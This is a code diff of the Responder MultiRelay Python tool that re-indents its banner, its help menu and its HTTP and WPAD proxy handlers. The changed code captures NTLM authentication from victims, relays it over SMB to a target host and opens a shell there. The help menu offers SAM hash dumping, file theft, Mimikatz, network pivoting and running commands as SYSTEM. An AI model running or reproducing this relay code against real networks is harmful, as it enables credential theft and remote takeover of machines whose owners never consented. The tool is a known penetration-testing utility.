@@ -101,43 +101,43 @@ def color(txt, code = 1, modifier = 0):
     return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)
 
 def ShowWelcome():
-     print(color('\nResponder MultiRelay %s NTLMv1/2 Relay' %(__version__),8,1))
-     print('\nSend bugs/hugs/comments to: laurent.gaffie@gmail.com')
-     print('Usernames to relay (-u) are case sensitive.')
-     print('To kill this script hit CTRL-C.\n')
-     print(color('/*',8,1))
-     print('Use this script in combination with Responder.py for best results.')
-     print('Make sure to set SMB and HTTP to OFF in Responder.conf.\n')
-     print('This tool listen on TCP port 80, 3128 and 445.')
-     print('For optimal pwnage, launch Responder only with these 2 options:')
-     print('-rv\nAvoid running a command that will likely prompt for information like net use, etc.')
-     print('If you do so, use taskkill (as system) to kill the process.')
-     print(color('*/',8,1))
-     print(color('\nRelaying credentials for these users:',8,1))
-     print(color(UserToRelay,4,1))
-     print('\n')
+    print(color('\nResponder MultiRelay %s NTLMv1/2 Relay' %(__version__),8,1))
+    print('\nSend bugs/hugs/comments to: laurent.gaffie@gmail.com')
+    print('Usernames to relay (-u) are case sensitive.')
+    print('To kill this script hit CTRL-C.\n')
+    print(color('/*',8,1))
+    print('Use this script in combination with Responder.py for best results.')
+    print('Make sure to set SMB and HTTP to OFF in Responder.conf.\n')
+    print('This tool listen on TCP port 80, 3128 and 445.')
+    print('For optimal pwnage, launch Responder only with these 2 options:')
+    print('-rv\nAvoid running a command that will likely prompt for information like net use, etc.')
+    print('If you do so, use taskkill (as system) to kill the process.')
+    print(color('*/',8,1))
+    print(color('\nRelaying credentials for these users:',8,1))
+    print(color(UserToRelay,4,1))
+    print('\n')
 
 
 ShowWelcome()
 
 def ShowHelp():
-     print(color('Available commands:',8,0))
-     print(color('dump',8,1)+'               -> Extract the SAM database and print(hashes.')
-     print(color('regdump KEY',8,1)+'        -> Dump an HKLM registry key (eg: regdump SYSTEM)')
-     print(color('read Path_To_File',8,1)+'  -> Read a file (eg: read /windows/win.ini)')
-     print(color('get  Path_To_File',8,1)+'  -> Download a file (eg: get users/administrator/desktop/password.txt)')
-     print(color('delete Path_To_File',8,1)+'-> Delete a file (eg: delete /windows/temp/executable.exe)')
-     print(color('upload Path_To_File',8,1)+'-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \\windows\\temp\\')
-     print(color('runas  Command',8,1)+'     -> Run a command as the currently logged in user. (eg: runas whoami)')
-     print(color('scan /24',8,1)+'           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to')
-     print(color('pivot  IP address',8,1)+'  -> Connect to another host (eg: pivot 10.0.0.12)')
-     print(color('mimi  command',8,1)+'      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)')
-     print(color('mimi32  command',8,1)+'    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)')
-     print(color('lcmd  command',8,1)+'      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)')
-     print(color('help',8,1)+'               -> Print this message.')
-     print(color('exit',8,1)+'               -> Exit this shell and return in relay mode.')
-     print('                      If you want to quit type exit and then use CTRL-C\n')
-     print(color('Any other command than that will be run as SYSTEM on the target.\n',8,1))
+    print(color('Available commands:',8,0))
+    print(color('dump',8,1)+'               -> Extract the SAM database and print(hashes.')
+    print(color('regdump KEY',8,1)+'        -> Dump an HKLM registry key (eg: regdump SYSTEM)')
+    print(color('read Path_To_File',8,1)+'  -> Read a file (eg: read /windows/win.ini)')
+    print(color('get  Path_To_File',8,1)+'  -> Download a file (eg: get users/administrator/desktop/password.txt)')
+    print(color('delete Path_To_File',8,1)+'-> Delete a file (eg: delete /windows/temp/executable.exe)')
+    print(color('upload Path_To_File',8,1)+'-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \\windows\\temp\\')
+    print(color('runas  Command',8,1)+'     -> Run a command as the currently logged in user. (eg: runas whoami)')
+    print(color('scan /24',8,1)+'           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to')
+    print(color('pivot  IP address',8,1)+'  -> Connect to another host (eg: pivot 10.0.0.12)')
+    print(color('mimi  command',8,1)+'      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)')
+    print(color('mimi32  command',8,1)+'    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)')
+    print(color('lcmd  command',8,1)+'      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)')
+    print(color('help',8,1)+'               -> Print this message.')
+    print(color('exit',8,1)+'               -> Exit this shell and return in relay mode.')
+    print('                      If you want to quit type exit and then use CTRL-C\n')
+    print(color('Any other command than that will be run as SYSTEM on the target.\n',8,1))
 
 Logs_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/../"
 Logs = logging
@@ -223,66 +223,66 @@ class HTTPProxyRelay(BaseRequestHandler):
                 #Get NTLM Message code. (1:negotiate, 2:challenge, 3:auth)
                 Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
 
-            if Packet_NTLM == "\x01":
-                ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
-                h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
-                n = SMBNegoCairo(Data = SMBNegoCairoData())
-                n.calculate()
-                packet0 = str(h)+str(n)
-                buffer0 = longueur(packet0)+packet0
-                s.send(buffer0)
-                smbdata = s.recv(2048)
-                ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
-                if smbdata[8:10] == "\x72\x00":
-                    head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",mid="\x02\x00")
-                    t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
-                    t.calculate()
-                    packet1 = str(head)+str(t)
-                    buffer1 = longueur(packet1)+packet1
-                    s.send(buffer1)
-                    smbdata = s.recv(2048) #got it here.
-
-                ## Send HTTP Proxy
-                Buffer_Ans = WPAD_NTLM_Challenge_Ans()
-                Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
-                key = ExtractHTTPChallenge(smbdata,Pivoting)#Grab challenge key for later use (hash parsing).
-                self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
-                data = self.request.recv(8092)
-                NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
-                Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]
-
-                ##Got NTLM Message 3 from client.
-            if Packet_NTLM == "\x03":
-                NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
-                ##Might be anonymous, verify it and if so, send no go to client.
-                if IsSMBAnonymous(NTLM_Auth):
-                    Response = WPAD_Auth_407_Ans()
-                    self.request.send(str(Response))
-                    data = self.request.recv(8092)
-                else:
-                    #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
-                    #and has not attempted before. While at it, let's grab his hash.
-                    Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host[0],Pivoting)
-
-                    if Username is not None:
-                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",uid=smbdata[32:34],mid="\x03\x00")
-                        t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
+                if Packet_NTLM == "\x01":
+                    ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
+                    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
+                    n = SMBNegoCairo(Data = SMBNegoCairoData())
+                    n.calculate()
+                    packet0 = str(h)+str(n)
+                    buffer0 = longueur(packet0)+packet0
+                    s.send(buffer0)
+                    smbdata = s.recv(2048)
+                    ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
+                    if smbdata[8:10] == "\x72\x00":
+                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",mid="\x02\x00")
+                        t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
                         t.calculate()
                         packet1 = str(head)+str(t)
                         buffer1 = longueur(packet1)+packet1
-                        print("[+] SMB Session Auth sent.")
                         s.send(buffer1)
-                        smbdata = s.recv(2048)
-                        RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
-                        if RunCmd is None:
-                            s.close()
-                        self.request.close()
-                        return None
+                        smbdata = s.recv(2048) #got it here.
+
+                    ## Send HTTP Proxy
+                    Buffer_Ans = WPAD_NTLM_Challenge_Ans()
+                    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
+                    key = ExtractHTTPChallenge(smbdata,Pivoting)#Grab challenge key for later use (hash parsing).
+                    self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
+                    data = self.request.recv(8092)
+                    NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
+                    Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]
+
+                    ##Got NTLM Message 3 from client.
+                    if Packet_NTLM == "\x03":
+                        NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
+                        ##Might be anonymous, verify it and if so, send no go to client.
+                        if IsSMBAnonymous(NTLM_Auth):
+                            Response = WPAD_Auth_407_Ans()
+                            self.request.send(str(Response))
+                            data = self.request.recv(8092)
+                        else:
+                            #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
+                            #and has not attempted before. While at it, let's grab his hash.
+                            Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host[0],Pivoting)
+
+                            if Username is not None:
+                                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",uid=smbdata[32:34],mid="\x03\x00")
+                                t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
+                                t.calculate()
+                                packet1 = str(head)+str(t)
+                                buffer1 = longueur(packet1)+packet1
+                                print("[+] SMB Session Auth sent.")
+                                s.send(buffer1)
+                                smbdata = s.recv(2048)
+                                RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
+                                if RunCmd is None:
+                                    s.close()
+                                    self.request.close()
+                                    return None
 
             else:
                 ##Any other type of request, send a 407.
                 Response = WPAD_Auth_407_Ans()
-            self.request.send(str(Response))
+                self.request.send(str(Response))
 
         except Exception:
             self.request.close()
@@ -320,61 +320,61 @@ class HTTPRelay(BaseRequestHandler):
                 #Get NTLM Message code. (1:negotiate, 2:challenge, 3:auth)
                 Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
 
-            if Packet_NTLM == "\x01":
-                ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
-                h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
-                n = SMBNegoCairo(Data = SMBNegoCairoData())
-                n.calculate()
-                packet0 = str(h)+str(n)
-                buffer0 = longueur(packet0)+packet0
-                s.send(buffer0)
-                smbdata = s.recv(2048)
-                ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
-                if smbdata[8:10] == "\x72\x00":
-                    head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",mid="\x02\x00")
-                    t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
-                    t.calculate()
-                    packet1 = str(head)+str(t)
-                    buffer1 = longueur(packet1)+packet1
-                    s.send(buffer1)
-                    smbdata = s.recv(2048) #got it here.
-
-                ## Send HTTP Response.
-                Buffer_Ans = IIS_NTLM_Challenge_Ans()
-                Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
-                key = ExtractHTTPChallenge(smbdata,Pivoting)#Grab challenge key for later use (hash parsing).
-                self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
-                data = self.request.recv(8092)
-                NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
-                Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]
-
-                ##Got NTLM Message 3 from client.
-            if Packet_NTLM == "\x03":
-                NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
-                ##Might be anonymous, verify it and if so, send no go to client.
-                if IsSMBAnonymous(NTLM_Auth):
-                    Response = IIS_Auth_401_Ans()
-                    self.request.send(str(Response))
-                    data = self.request.recv(8092)
-                else:
-                    #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
-                    #and has not attempted before. While at it, let's grab his hash.
-                    Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host[0],Pivoting)
-
-                    if Username is not None:
-                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",uid=smbdata[32:34],mid="\x03\x00")
-                        t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
+                if Packet_NTLM == "\x01":
+                    ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
+                    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
+                    n = SMBNegoCairo(Data = SMBNegoCairoData())
+                    n.calculate()
+                    packet0 = str(h)+str(n)
+                    buffer0 = longueur(packet0)+packet0
+                    s.send(buffer0)
+                    smbdata = s.recv(2048)
+                    ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
+                    if smbdata[8:10] == "\x72\x00":
+                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",mid="\x02\x00")
+                        t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
                         t.calculate()
                         packet1 = str(head)+str(t)
                         buffer1 = longueur(packet1)+packet1
-                        print("[+] SMB Session Auth sent.")
                         s.send(buffer1)
-                        smbdata = s.recv(2048)
-                        RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
-                        if RunCmd is None:
-                            s.close()
-                            self.request.close()
-                            return None
+                        smbdata = s.recv(2048) #got it here.
+
+                    ## Send HTTP Response.
+                    Buffer_Ans = IIS_NTLM_Challenge_Ans()
+                    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
+                    key = ExtractHTTPChallenge(smbdata,Pivoting)#Grab challenge key for later use (hash parsing).
+                    self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
+                    data = self.request.recv(8092)
+                    NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
+                    Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]
+
+                    ##Got NTLM Message 3 from client.
+                    if Packet_NTLM == "\x03":
+                        NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
+                        ##Might be anonymous, verify it and if so, send no go to client.
+                        if IsSMBAnonymous(NTLM_Auth):
+                            Response = IIS_Auth_401_Ans()
+                            self.request.send(str(Response))
+                            data = self.request.recv(8092)
+                        else:
+                            #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
+                    #and has not attempted before. While at it, let's grab his hash.
+                            Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host[0],Pivoting)
+
+                            if Username is not None:
+                                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",uid=smbdata[32:34],mid="\x03\x00")
+                                t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
+                                t.calculate()
+                                packet1 = str(head)+str(t)
+                                buffer1 = longueur(packet1)+packet1
+                                print("[+] SMB Session Auth sent.")
+                                s.send(buffer1)
+                                smbdata = s.recv(2048)
+                                RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
+                                if RunCmd is None:
+                                    s.close()
+                                    self.request.close()
+                                    return None
 
             else:
                 ##Any other type of request, send a 401.
